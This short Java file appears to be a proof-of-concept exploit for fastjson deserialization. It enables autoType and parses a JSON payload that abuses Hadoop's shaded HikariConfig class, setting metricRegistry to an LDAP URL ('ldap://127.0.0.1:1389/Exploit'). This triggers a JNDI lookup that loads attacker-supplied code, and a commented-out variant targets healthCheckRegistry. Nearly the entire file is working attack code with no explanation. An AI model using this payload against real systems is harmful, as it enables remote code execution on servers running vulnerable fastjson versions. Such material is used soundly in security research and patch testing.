import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class HadoopHikariPoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}";
//        String payload2 = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}";
        JSON.parse(payload);
    }
}
